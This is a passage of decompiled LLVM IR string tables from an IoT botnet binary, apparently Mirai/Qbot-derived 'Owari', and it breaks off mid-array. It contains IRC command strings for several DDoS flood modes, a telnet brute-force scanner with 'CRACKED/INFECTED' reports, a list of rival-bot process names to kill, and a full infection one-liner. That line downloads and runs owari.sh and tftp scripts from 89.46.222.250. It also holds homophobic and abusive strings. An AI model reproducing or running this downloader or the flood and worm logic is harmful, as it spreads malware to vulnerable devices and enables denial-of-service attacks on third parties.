@global_var_8069e96.274 = constant [6 x i8] c"urgay\00"
@global_var_8069e9c.275 = constant [16 x i8] c"tfw u like dick\00"
@global_var_8069eac.276 = constant [9 x i8] c"dickbutt\00"
@global_var_8069eb5.277 = constant [20 x i8] c"The elusive dickbut\00"
@global_var_8069ec9.278 = constant [27 x i8] c"Heyyy that's pretty gooood\00"
@global_var_8069ee4.279 = constant [15 x i8] c"NSA sucks cock\00"
@global_var_8069ef3.280 = constant [15 x i8] c"FBI sucks cock\00"
@global_var_8069f04.281 = constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00"
@global_var_8069f3b.282 = constant [28 x i8] c"Oh yeah I like nulling shit\00"
@global_var_8069f57.283 = constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00"
@global_var_8069f74.284 = constant [28 x i8] c"Keemstar is a fucking knome\00"
@global_var_8069f90.285 = constant [17 x i8] c"Leafy is gawd <3\00"
@global_var_8069fa1.286 = constant [25 x i8] c"Ourmine is full of skids\00"
@global_var_8069fba.287 = constant [23 x i8] c"Sh4dow is the greatest\00"
@global_var_8069fe0.288 = constant [79 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069aa9.210, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069aad.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069ab1.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069ab5.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069ab9.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069abf.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8069ac3.216, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8069acd.217, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069ad8.218, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069adc.219, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069ae0.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8069ae6.221, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8069aef.222, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069afc.223, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8069b11.224, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8069b1b.225, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_8069b2d.226, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_8069b44.227, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_8069b60.228, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_8069b88.229, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_8069bb0.230, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_8069bd8.231, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8069bfd.232, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8069c0d.233, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8069c15.234, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_8069c20.235, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8069c4f.236, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8069c61.237, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8069c6a.238, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069c77.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8069c8c.240, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069c77.239, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8069c94.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069ca1.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069ca6.243, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069cab.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8069cb0.245, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_8069cb8.246, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8069cd9.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069ceb.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069cf1.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069cf7.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8069cfc.251, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8069d03.252, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069d0c.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069d12.254, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069d16.255, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8069d1a.256, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8069d23.257, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_8069d2e.258, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8069d4b.259, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_8069d63.260, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8069d7c.261, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069d94.262, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8069da9.263, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8069db8.264, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8069dd8.265, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_8069df0.266, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8069e07.267, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_8069e15.268, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_8069e2c.269, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8069e4f.270, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069e61.271, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_8069e76.272, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8069e8c.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069e96.274, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8069e9c.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8069eac.276, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8069eb5.277, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_8069ec9.278, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8069ee4.279, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8069ef3.280, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8069f04.281, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_8069f3b.282, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_8069f57.283, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_8069f74.284, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8069f90.285, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_8069fa1.286, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_8069fba.287, i32 0, i32 0)]
@global_var_806a124.289 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_806a148.290 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_806a168.291 = constant [7 x i8] c"(null)\00"
@global_var_806a1a8.292 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_806a204.293 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_806a254.297 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0AConnection: %s\0D\0A\0D\0A\00"
@global_var_806a294.298 = constant [64 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\0A\00"
@global_var_806a2d4.299 = constant [46 x i8] c"NOTICE %s :HTTP %s flooding %s with %d power\0A\00"
@global_var_806a304.300 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_806a328.301 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_806a348.302 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_806a36c.303 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_806ff40 = external global i32
@global_var_8068818.305 = constant i32 4063267
@global_var_806881c.307 = constant [6 x i8] c"shell\00"
@global_var_80687ad.310 = constant [7 x i8] c"nvalid\00"
@global_var_80687b4.311 = constant [6 x i8] c"ailed\00"
@global_var_80687ba.312 = constant [9 x i8] c"ncorrect\00"
@global_var_80687c3.313 = constant [6 x i8] c"enied\00"
@global_var_80687c9.314 = constant [6 x i8] c"error\00"
@global_var_80687cf.315 = constant [8 x i8] c"goodbye\00"
@global_var_80687d7.316 = constant [4 x i8] c"bad\00"
@global_var_80687db.317 = constant [8 x i8] c"timeout\00"
@global_var_806fee0.318 = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80687ad.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687b4.311, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80687ba.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687c3.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687c9.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80687cf.315, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80687d7.316, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80687db.317, i32 0, i32 0)]
@global_var_806a38c.319 = constant [6 x i8] c":>%$#\00"
@global_var_806feb0 = external global i32
@global_var_806a393.325 = constant [3 x i8] c"\0D\0A\00"
@global_var_8068829.326 = constant [5 x i8] c"rror\00"
@global_var_806882e.327 = constant [7 x i8] c"oodbye\00"
@global_var_8067529.328 = constant [8 x i8] c"busybox\00"
@global_var_806ff60.329 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80687ad.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687b4.311, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80687ba.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687c3.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068829.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806882e.327, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80687d7.316, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067529.328, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_8068816.304 to i8*), i8* bitcast (i32* @global_var_8068818.305 to i8*)]
@global_var_807e56c.330 = local_unnamed_addr global i32 0
@global_var_806a398.331 = constant [44 x i8] c"PRIVMSG %s :[TELNET] CRACKED - %s:23 %s:%s\0A\00"
@global_var_8068835.332 = constant [3 x i8] c"sh\00"
@global_var_8068838.333 = constant [8 x i8] c"/bin/sh\00"
@global_var_8068840.334 = constant [5 x i8] c"dash\00"
@global_var_806ff8c.335 = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806881c.307, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068835.332, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068838.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068840.334, i32 0, i32 0)]
@global_var_806a3c4.336 = constant [5 x i8] c"%s\0D\0A\00"
@global_var_80687e3.337 = constant [6 x i8] c"/tmp/\00"
@global_var_80687e9.338 = constant [6 x i8] c"/var/\00"
@global_var_80687ef.339 = constant [10 x i8] c"/var/run/\00"
@global_var_80687f9.340 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8068803.341 = constant [6 x i8] c"/mnt/\00"
@global_var_8068809.342 = constant [7 x i8] c"/boot/\00"
@global_var_8068810.343 = constant [6 x i8] c"/usr/\00"
@global_var_806ff20.344 = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687e3.337, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80687e9.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80687ef.339, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80687f9.340, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068803.341, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068809.342, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068810.343, i32 0, i32 0)]
@global_var_806a3cc.345 = constant [65 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\0D\0A\00"
@global_var_806a40d.346 = constant [29 x i8] c">%s.t && cd %s ; >retrieve\0D\0A\00"
@global_var_8067204.347 = constant [352 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.46.222.250/owari.sh || curl -O http://89.46.222.250/owari.sh; chmod 777 owari.sh; sh owari.sh; busybox tftp 89.46.222.250 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 89.46.222.250; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf owari.sh tftp1.sh tftp2.sh\00"
@global_var_806f8b8.348 = local_unnamed_addr global [352 x i8]* @global_var_8067204.347
@global_var_806a42c.349 = constant [45 x i8] c"PRIVMSG %s :[TELNET] INFECTED - %s:23 %s:%s\0A\00"
@global_var_806a45c.350 = constant [53 x i8] c"PRIVMSG %s :[TELNET] FAILED TO INFECT - %s:23 %s:%s\0A\00"
@global_var_80748e0.351 = local_unnamed_addr global i32 0
@global_var_806a4b8.352 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_806a4d5.353 = constant [3 x i8] c"ON\00"
@global_var_806a4d8.354 = constant [3 x i8] c"on\00"
@global_var_806a4dc.355 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_806a508.356 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_806a53c.357 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_806a56f.358 = constant [4 x i8] c"OFF\00"
@global_var_806a573.359 = constant [4 x i8] c"off\00"
@global_var_806a578.360 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_806a5a4.361 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_806a5d8.362 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_8067364.363 = constant [8 x i8] c"mirai.*\00"
@global_var_806736c.364 = constant [10 x i8] c"dlr.*mips\00"
@global_var_8067376.365 = constant [7 x i8] c"mips64\00"
@global_var_806737d.366 = constant [7 x i8] c"mipsel\00"
@global_var_8067384.367 = constant [6 x i8] c"sh2eb\00"
@global_var_806738a.368 = constant [7 x i8] c"sh2elf\00"
@global_var_8067391.369 = constant [4 x i8] c"sh4\00"
@global_var_8067395.370 = constant [4 x i8] c"x86\00"
@global_var_8067399.371 = constant [4 x i8] c"arm\00"
@global_var_806739d.372 = constant [6 x i8] c"armv5\00"
@global_var_80673a3.373 = constant [8 x i8] c"armv4tl\00"
@global_var_80673ab.374 = constant [6 x i8] c"armv4\00"
@global_var_80673b1.375 = constant [6 x i8] c"armv6\00"
@global_var_80673b7.376 = constant [5 x i8] c"i686\00"
@global_var_80673bc.377 = constant [8 x i8] c"powerpc\00"
@global_var_80673c4.378 = constant [13 x i8] c"powerpc440fp\00"
@global_var_80673d1.379 = constant [5 x i8] c"i586\00"
@global_var_80673d6.380 = constant [5 x i8] c"m68k\00"
@global_var_80673db.381 = constant [6 x i8] c"sparc\00"
@global_var_80673e1.382 = constant [7 x i8] c"x86_64\00"
@global_var_80673e8.383 = constant [8 x i8] c"jackmy*\00"
@global_var_80673f0.384 = constant [8 x i8] c"hackmy*\00"
@global_var_80673f8.385 = constant [3 x i8] c"b1\00"
@global_var_80673fb.386 = constant [3 x i8] c"b2\00"
@global_var_80673fe.387 = constant [3 x i8] c"b3\00"
@global_var_8067401.388 = constant [3 x i8] c"b4\00"
@global_var_8067404.389 = constant [3 x i8] c"b5\00"
@global_var_8067407.390 = constant [3 x i8] c"b6\00"
@global_var_806740a.391 = constant [3 x i8] c"b7\00"
@global_var_806740d.392 = constant [3 x i8] c"b8\00"
@global_var_8067410.393 = constant [3 x i8] c"b9\00"
@global_var_8067413.394 = constant [4 x i8] c"b10\00"
@global_var_8067417.395 = constant [4 x i8] c"b11\00"
@global_var_806741b.396 = constant [4 x i8] c"b12\00"
@global_var_806741f.397 = constant [4 x i8] c"b13\00"
@global_var_8067423.398 = constant [4 x i8] c"b14\00"
@global_var_8067427.399 = constant [4 x i8] c"b15\00"
@global_var_806742b.400 = constant [4 x i8] c"b16\00"
@global_var_806742f.401 = constant [4 x i8] c"b17\00"
@global_var_8067433.402 = constant [4 x i8] c"b18\00"
@global_var_8067437.403 = constant [4 x i8] c"b19\00"
@global_var_806743b.404 = constant [4 x i8] c"b20\00"
@global_var_806743f.405 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8067450.406 = constant [10 x i8] c"dvrHelper\00"
@global_var_806745a.407 = constant [5 x i8] c"kmy*\00"
@global_var_806745f.408 = constant [5 x i8] c"lol*\00"
@global_var_8067464.409 = constant [8 x i8] c"telmips\00"
@global_var_806746c.410 = constant [10 x i8] c"telmips64\00"
@global_var_8067476.411 = constant [10 x i8] c"telmipsel\00"
@global_var_8067480.412 = constant [9 x i8] c"telsh2eb\00"
@global_var_8067489.413 = constant [10 x i8] c"telsh2elf\00"
@global_var_8067493.414 = constant [7 x i8] c"telsh4\00"
@global_var_806749a.415 = constant [7 x i8] c"telx86\00"
@global_var_80674a1.416 = constant [9 x i8] c"telarmv5\00"
@global_var_80674aa.417 = constant [11 x i8] c"telarmv4tl\00"
@global_var_80674b5.418 = constant [9 x i8] c"telarmv4\00"
@global_var_80674be.419 = constant [9 x i8] c"telarmv6\00"
@global_var_80674c7.420 = constant [8 x i8] c"teli686\00"
@global_var_80674cf.421 = constant [11 x i8] c"telpowerpc\00"
@global_var_80674da.422 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_80674ea.423 = constant [8 x i8] c"teli586\00"
@global_var_80674f2.424 = constant [8 x i8] c"telm68k\00"
@global_var_80674fa.425 = constant [9 x i8] c"telsparc\00"
@global_var_8067503.426 = constant [10 x i8] c"telx86_64\00"
@global_var_806750d.427 = constant [9 x i8] c"TwoFace*\00"
@global_var_8067516.428 = constant [5 x i8] c"xxb*\00"
@global_var_806751b.429 = constant [3 x i8] c"bb\00"
@global_var_806751e.430 = constant [11 x i8] c"busybotnet\00"
@global_var_8067531.431 = constant [7 x i8] c"badbox\00"
@global_var_8067538.432 = constant [3 x i8] c"B1\00"
@global_var_806753b.433 = constant [3 x i8] c"B2\00"
@global_var_806753e.434 = constant [3 x i8] c"B3\00"
@global_var_8067541.435 = constant [3 x i8] c"B4\00"
@global_var_8067544.436 = constant [3 x i8] c"B5\00"
@global_var_8067547.437 = constant [3 x i8] c"B6\00"
@global_var_806754a.438 = constant [3 x i8] c"B7\00"
@global_var_806754d.439 = constant [3 x i8] c"B8\00"
@global_var_8067550.440 = constant [3 x i8] c"B9\00"
@global_var_8067553.441 = constant [4 x i8] c"B10\00"
@global_var_8067557.442 = constant [4 x i8] c"B11\00"
@global_var_806755b.443 = constant [4 x i8] c"B12\00"
@global_var_806755f.444 = constant [4 x i8] c"B13\00"
@global_var_8067563.445 = constant [4 x i8] c"B14\00"
@global_var_8067567.446 = constant [4 x i8] c"B15\00"
@global_var_806756b.447 = constant [4 x i8] c"B16\00"
@global_var_806756f.448 = constant [4 x i8] c"B17\00"
@global_var_8067573.449 = constant [4 x i8] c"B18\00"
@global_var_8067577.450 = constant [4 x i8] c"B20\00"
@global_var_806757b.451 = constant [7 x i8] c"gaybot\00"
@global_var_8067582.452 = constant [6 x i8] c"hackz\00"
@global_var_8067588.453 = constant [5 x i8] c"bin*\00"
@global_var_806758d.454 = constant [5 x i8] c"gtop\00"
@global_var_8067592.455 = constant [7 x i8] c"botnet\00"
@global_var_8067599.456 = constant [8 x i8] c"swatnet\00"
@global_var_80675a1.457 = constant [8 x i8] c"ballpit\00"
@global_var_80675a9.458 = constant [8 x i8] c"fucknet\00"
@global_var_80675b1.459 = constant [9 x i8] c"cracknet\00"
@global_var_80675ba.460 = constant [8 x i8] c"weednet\00"
@global_var_80675c2.461 = constant [7 x i8] c"gaynet\00"
@global_var_80675c9.462 = constant [9 x i8] c"queernet\00"
@global_var_80675d2.463 = constant [8 x i8] c"ballnet\00"
@global_var_80675da.464 = constant [5 x i8] c"unet\00"
@global_var_80675df.465 = constant [7 x i8] c"yougay\00"
@global_var_80675e6.466 = constant [7 x i8] c"sttftp\00"
@global_var_80675ed.467 = constant [7 x i8] c"sstftp\00"
@global_var_80675f4.468 = constant [7 x i8] c"sbtftp\00"
@global_var_80675fb.469 = constant [6 x i8] c"btftp\00"
@global_var_8067601.470 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_806760a.471 = constant [6 x i8] c"bruv*\00"
@global_var_8067610.472 = constant [5 x i8] c"IoT*\00"
@global_var_8067615.473 = constant [6 x i8] c"kawi*\00"
@global_var_806761b.474 = constant [6 x i8] c"kiwi*\00"
@global_var_8067621.475 = constant [8 x i8] c"botgod*\00"
@global_var_806f8c0.476 = global [114 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067364.363, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806736c.364, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067376.365, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806737d.366, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067384.367, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806738a.368, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067391.369, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067395.370, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067399.371, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806739d.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80673a3.373, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80673ab.374, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80673b1.375, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80673b7.376, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80673bc.377, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80673c4.378, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80673d1.379, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80673d6.380, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80673db.381, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80673e1.382, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80673e8.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80673f0.384, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80673f8.385, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80673fb.386, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80673fe.387, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067401.388, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067404.389, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067407.390, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806740a.391, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806740d.392, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067410.393, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067413.394, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067417.395, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806741b.396, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806741f.397, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067423.398, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067427.399, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806742b.400, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806742f.401, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067433.402, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067437.403, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806743b.404, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806743f.405, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067450.406, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806745a.407, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806745f.408, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067464.409, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806746c.410, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067476.411, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067480.412, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067489.413, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067493.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806749a.415, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80674a1.416, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80674aa.417, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], 